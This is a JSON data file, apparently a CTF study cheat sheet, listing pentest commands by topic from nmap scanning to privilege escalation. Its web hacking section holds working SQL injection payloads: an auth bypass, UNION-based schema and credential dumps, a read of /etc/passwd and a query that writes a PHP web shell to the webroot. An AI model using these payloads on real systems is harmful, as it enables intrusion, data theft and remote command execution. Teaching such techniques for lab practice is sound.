@@ -1,0 +1,488 @@
+[
+  {
+    "id": "system-hacking",
+    "title": "System Hacking",
+    "difficulty": "Intermediate",
+    "description": "To discover hosts, services, and vulnerabilities efficiently in CTF environments, System Hacking is the foundation of any penetration test.",
+    "concept": "System hacking is a multi-stage process starting with discovery and enumeration. Nmap is the industry standard for identifying open ports and service versions. For stealthier local network discovery, Netdiscover passively listens for ARP requests to find live hosts. Successful system hacking relies on meticulous scanning to identify weak services like outdated Apache servers, misconfigured SMB shares, or exposed RPC ports.",
+    "tools": [
+      {
+        "name": "Nmap Scanning",
+        "description": "Network Mapper - The industry standard for network discovery and security auditing.",
+        "commands": [
+          {
+            "command": "nmap -sn 10.10.0.0/24",
+            "description": "Discover Live Hosts in a Subnet",
+            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 10.10.0.1\nHost is up (0.001s latency).\nNmap scan report for 10.10.0.5\nHost is up (0.05s latency)."
+          },
+          {
+            "command": "nmap -sV -sC <IP>",
+            "description": "Service Detection & Default Scripts",
+            "usage": "Identify open ports and run standard enumeration scripts."
+          },
+          {
+            "command": "nmap --script vuln <IP>",
+            "description": "Vulnerability Scanning",
+            "simulation": "| http-enum: \n|   /login.php: Possible admin login page\n|   /robots.txt: Robots.txt found"
+          },
+          {
+            "command": "nmap -sS -T4 -A -p- <IP>",
+            "description": "Aggressive Full Port Scan"
+          },
+          {
+            "command": "nmap --script ssl-enum-ciphers -p 443 <IP>",
+            "description": "SSL/TLS Enumeration"
+          }
+        ]
+      },
+      {
+        "name": "Netdiscover",
+        "description": "Passive ARP reconnaissance tool for local network discovery.",
+        "commands": [
+          {
+            "command": "netdiscover -r 10.10.0.0/24",
+            "description": "Scan specific subnet range"
+          }
+        ]
+      },
+      {
+        "name": "SMB & RPC Enumeration",
+        "description": "Tools for investigating Windows-specific services.",
+        "commands": [
+          {
+            "command": "smbclient -L \\\\\\\\<IP>",
+            "description": "List anonymous shares"
+          },
+          {
+            "command": "enum4linux -a <IP>",
+            "description": "Full SMB enumeration sweep"
+          },
+          {
+            "command": "rpcclient -U \"\" <IP>",
+            "description": "Anonymous RPC Login"
+          },
+          {
+            "command": "smbmap -H <IP> -u admin -p pass",
+            "description": "Enumerate shares with creds"
+          },
+          {
+            "command": "python3 psexec.py admin@<IP>",
+            "description": "Gain shell via Impacket psexec",
+            "usage": "Requires valid admin credentials and ADMIN$ share access."
+          }
+        ]
+      },
+      {
+        "name": "WordPress & CMS",
+        "description": "Targeting common content management systems.",
+        "commands": [
+          {
+            "command": "wpscan --url http://<IP> --enumerate u,vp,vt",
+            "description": "Scan WordPress for vulnerabilities"
+          },
+          {
+            "command": "cewl -w wordlist.txt -d 5 -m 5 http://<IP>",
+            "description": "Generate custom wordlist from site",
+            "usage": "Crawl the website to create a list of words for password attacks."
+          }
+        ]
+      },
+      {
+        "name": "Exploit Search",
+        "description": "Finding known exploits for identified services.",
+        "commands": [
+          {
+            "command": "searchsploit apache 2.4.49",
+            "description": "Search Exploit-DB by name/version"
+          },
+          {
+            "command": "searchsploit -x 12345.txt",
+            "description": "Examine exploit source code"
+          }
+        ]
+      }
+    ],
+    "attackChain": [
+      {
+        "step": "Recon",
+        "desc": "Passive discovery via Netdiscover and OSINT."
+      },
+      {
+        "step": "Scan",
+        "desc": "Active enumeration using Nmap scripts."
+      },
+      {
+        "step": "Enum",
+        "desc": "Identify SMB shares or RPC vulnerabilities."
+      },
+      {
+        "step": "Exploit",
+        "desc": "Use searchsploit or Metasploit for the first foothold."
+      }
+    ],
+    "challenges": []
+  },
+  {
+    "id": "web-hacking",
+    "title": "Web Hacking",
+    "difficulty": "Intermediate",
+    "description": "Transforming web enumeration into exploitation by identifying hidden paths and vulnerable parameters.",
+    "concept": "Web hacking follows a rigorous five-stage cycle: Reconnaissance (passive/active), Scanning & Enumeration (identifying versions), Gaining Access (exploiting vulnerabilities like SQLi/XSS), Maintaining Access (web shells), and Covering Tracks. Essential techniques include directory bursting with Gobuster to find hidden admin panels or backup files, and vulnerability scanning with Nikto to detect outdated software or insecure headers.",
+    "tools": [
+      {
+        "name": "Enumeration & Recon",
+        "description": "Intelligence gathering for web applications.",
+        "commands": [
+          {
+            "command": "nikto -h <IP>",
+            "description": "Web vulnerability scanner"
+          },
+          {
+            "command": "whatweb <IP>",
+            "description": "Identify web technologies and CMS"
+          },
+          {
+            "command": "theharvester -d domain.com -l 500 -b google",
+            "description": "Gather emails and subdomains"
+          },
+          {
+            "command": "sublist3r -d domain.com",
+            "description": "Fast subdomain discovery"
+          }
+        ]
+      },
+      {
+        "name": "Directory & Parameter Fuzzing",
+        "description": "Discovering hidden endpoints and parameters.",
+        "commands": [
+          {
+            "command": "gobuster dir -u http://<IP>/ -w common.txt -x php,txt",
+            "description": "Brute-force directories"
+          },
+          {
+            "command": "wfuzz -c -z file,wordlist.txt --hc 404 http://<IP>/page.php?id=FUZZ",
+            "description": "Fuzz URL parameters"
+          }
+        ]
+      },
+      {
+        "name": "SQL Injection (Manual)",
+        "description": "Exploiting database vulnerabilities manually to bypass auth or dump data.",
+        "commands": [
+          {
+            "command": "' or '1'='1'-- -",
+            "description": "Auth Bypass Payload",
+            "usage": "Use in login forms to subvert query logic and login as admin."
+          },
+          {
+            "command": "' order by 1-- -",
+            "description": "Find Column Count (Union)",
+            "usage": "Increment number until error to find the total columns."
+          },
+          {
+            "command": "' union select 1,2,3-- -",
+            "description": "Identify Visible Columns",
+            "usage": "Check which numbers appear on the page to find injection points."
+          },
+          {
+            "command": "' union select 1,database(),user(),4-- -",
+            "description": "Dump DB & User Info",
+            "usage": "Extract basic environment information via Union SQLi."
+          }
+        ]
+      },
+      {
+        "name": "SQL Injection (Advanced)",
+        "description": "Reading files, RCE, and Blind/Time-based exploitation.",
+        "commands": [
+          {
+            "command": "' union select 1,load_file('/etc/passwd'),3,4-- -",
+            "description": "Read Local System Files",
+            "usage": "Exfiltrate sensitive files like /etc/passwd or config.php."
+          },
+          {
+            "command": "' union select \"\",\"<?php system($_GET['cmd']); ?>\",\"\",\"\" into outfile \"/var/www/html/shell.php\"-- -",
+            "description": "Web Shell Upload (RCE)",
+            "usage": "Write a PHP shell to the webroot to gain remote command execution."
+          },
+          {
+            "command": "admin' union select sleep(5),2,3-- -",
+            "description": "Time-Based Blind SQLi",
+            "usage": "Verify injection by forcing the server to pause for X seconds."
+          }
+        ]
+      },
+      {
+        "name": "SQLMap (Automated)",
+        "description": "Automatic SQL injection discovery and exploitation.",
+        "commands": [
+          {
+            "command": "sqlmap -u \"http://<IP>/index.php?id=1\" --batch --dbs",
+            "description": "Automated DB Enumeration"
+          },
+          {
+            "command": "sqlmap -r request.req --dump --level=5 --risk=3",
+            "description": "Aggressive Data Dump",
+            "usage": "Use a captured Burp request for high-coverage exploitation."
+          }
+        ]
+      },
+      {
+        "name": "SQLi Data Dumping",
+        "description": "Steps to exfiltrate table and column names.",
+        "commands": [
+          {
+            "command": "' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -",
+            "description": "Step 1: List Databases",
+            "usage": "Find all available databases on the server."
+          },
+          {
+            "command": "' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -",
+            "description": "Step 2: List Tables",
+            "usage": "List all tables within a specific database (e.g. 'dev')."
+          },
+          {
+            "command": "' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -",
+            "description": "Step 3: List Columns",
+            "usage": "Identify sensitive columns like 'username' or 'password'."
+          }
+        ]
+      },
+      {
+        "name": "Boolean-Based SQLi",
+        "description": "Blind exploitation using true/false responses.",
+        "commands": [
+          {
+            "command": "admin' UNION SELECT 1,2,3 where database() like 's%';--",
+            "description": "Enumerate DB Name",
+            "usage": "Brute-force characters to guess the database name one-by-one."
+          },
+          {
+            "command": "admin' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_name like 'u%';--",
+            "description": "Enumerate Table Name",
+            "usage": "Identify table names by observing the server's boolean response."
+          }
+        ]
+      }
+    ],
+    "attackChain": [
+      {
+        "step": "Fuzz",
+        "desc": "Identify injection parameters with ' or #."
+      },
+      {
+        "step": "Columns",
+        "desc": "Use 'ORDER BY' to find column count."
+      },
+      {
+        "step": "Schema",
+        "desc": "Extract DB, Table, and Column names."
+      },
+      {
+        "step": "Dump",
+        "desc": "Dump credentials from target columns."
+      }
+    ],
+    "challenges": [],
+    "resources": [
+      {
+        "title": "TryHackMe: SQL Injection",
+        "url": "https://tryhackme.com/room/sqlinjectionlm"
+      },
+      {
+        "title": "PortSwigger: SQL Injection Lab",
+        "url": "https://portswigger.net/web-security/sql-injection"
+      },
+      {
+        "title": "PayloadsAllTheThings: SQL Injection",
+        "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
+      }
+    ]
+  },
+  {
+    "id": "file-hacking",
+    "title": "File Hacking",
+    "difficulty": "Intermediate",
+    "description": "Extracting hidden data from PDFs, VHDs, and binary files.",
+    "concept": "File hacking often involves looking for 'magic bytes' to identify real file types, extracting strings, or mounting virtual drives to find sensitive data.",
+    "tools": [
+      {
+        "name": "Data Extraction",
+        "description": "Tools to uncover hidden information in files.",
+        "commands": [
+          {
+            "command": "strings <FILE> | grep -i flag",
+            "description": "Extract ASCII strings"
+          },
+          {
+            "command": "binwalk -e <FILE>",
+            "description": "Identify and extract embedded files"
+          },
+          {
+            "command": "qpdf --qdf --object-streams=disable in.pdf out.pdf",
+            "description": "Decompress PDF for inspection"
+          }
+        ]
+      },
+      {
+        "name": "Disk Forensics",
+        "description": "Analyzing virtual disks and filesystems.",
+        "commands": [
+          {
+            "command": "guestmount --add disk.vhd --inspector -ro /mnt/vhd",
+            "description": "Mount VHD on Linux"
+          },
+          {
+            "command": "dir /R",
+            "description": "Find Alternate Data Streams (Windows)",
+            "usage": "Lists files along with their hidden data streams."
+          }
+        ]
+      }
+    ],
+    "attackChain": [],
+    "challenges": []
+  },
+  {
+    "id": "cryptography",
+    "title": "Cryptography",
+    "difficulty": "Beginner",
+    "description": "Decrypting classic ciphers and modern encryption schemes.",
+    "concept": "Common ciphers include Caesar (shift), Vigenere (polyalphabetic), and XOR-based One-Time Pads. Frequency analysis is your best friend.",
+    "tools": [
+      {
+        "name": "Encoding & Ciphers",
+        "description": "Tools for data transformation.",
+        "commands": [
+          {
+            "command": "echo 'text' | base64 -d",
+            "description": "Base64 Decoding"
+          },
+          {
+            "command": "echo 'text' | tr 'A-Za-z' 'N-ZA-Mn-za-m'",
+            "description": "ROT13 Decoding"
+          }
+        ]
+      }
+    ],
+    "attackChain": [],
+    "challenges": []
+  },
+  {
+    "id": "forensics",
+    "title": "Forensics",
+    "difficulty": "Advanced",
+    "description": "Investigating artifacts in images, memory, and network captures.",
+    "concept": "Forensics involves identifying hidden data in images (Steganography), recovering deleted files from disk images, and analyzing USB keystroke traffic in PCAP files.",
+    "tools": [
+      {
+        "name": "Image Forensics",
+        "description": "Analyzing image files for hidden data.",
+        "commands": [
+          {
+            "command": "exiftool <FILE>",
+            "description": "View file metadata"
+          },
+          {
+            "command": "steghide extract -sf <FILE>",
+            "description": "Extract hidden stego data"
+          },
+          {
+            "command": "zsteg <FILE>",
+            "description": "Analyze LSB in PNG files"
+          }
+        ]
+      },
+      {
+        "name": "Network & USB",
+        "description": "Traffic and peripheral analysis.",
+        "commands": [
+          {
+            "command": "tshark -r file.pcap -Y 'usb.capdata' -T fields -e usb.capdata",
+            "description": "Recover USB keystrokes"
+          }
+        ]
+      }
+    ],
+    "attackChain": [],
+    "challenges": []
+  },
+  {
+    "id": "password-cracking",
+    "title": "Password Cracking",
+    "difficulty": "Intermediate",
+    "description": "Breaking hashes and protected archives using brute-force and dictionary attacks.",
+    "concept": "Password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system in scrambled form (hashes).",
+    "tools": [
+      {
+        "name": "Hash Cracking",
+        "description": "Recovering passwords from cryptographic hashes.",
+        "commands": [
+          {
+            "command": "john --wordlist=rockyou.txt hashes.txt",
+            "description": "Crack hashes with John the Ripper"
+          },
+          {
+            "command": "hashcat -m 0 -a 0 hashes.txt rockyou.txt",
+            "description": "Crack MD5 hashes with Hashcat"
+          }
+        ]
+      },
+      {
+        "name": "File & Key Cracking",
+        "description": "Decrypting protected files and keys.",
+        "commands": [
+          {
+            "command": "ssh2john id_rsa > ssh.hash",
+            "description": "Convert SSH key to hash"
+          },
+          {
+            "command": "zip2john file.zip > zip.hash",
+            "description": "Convert ZIP to hash"
+          }
+        ]
+      }
+    ],
+    "attackChain": [],
+    "challenges": []
+  },
+  {
+    "id": "privilege-escalation",
+    "title": "Privilege Escalation",
+    "difficulty": "Advanced",
+    "description": "Escalating from a low-privileged shell to root or SYSTEM access.",
+    "concept": "Privilege escalation focuses on misconfigurations, weak permissions, sudo rights, and kernel exploits. Automate the process using scripts like LinPEAS or WinPEAS.",
+    "tools": [
+      {
+        "name": "Enumeration",
+        "description": "Finding escalation vectors.",
+        "commands": [
+          {
+            "command": "linpeas.sh",
+            "description": "Linux PrivEsc Awesome Script"
+          },
+          {
+            "command": "winpeas.exe",
+            "description": "Windows PrivEsc Awesome Script"
+          },
+          {
+            "command": "sudo -l",
+            "description": "List sudo permissions"
+          }
+        ]
+      },
+      {
+        "name": "Techniques",
+        "description": "Common methods for escalation.",
+        "commands": [
+          {
+            "command": "find / -perm -u=s -type f 2>/dev/null",
+            "description": "Find SUID binaries"
+          }
+        ]
+      }
+    ],
+    "attackChain": [],
+    "challenges": []
+  }
+]
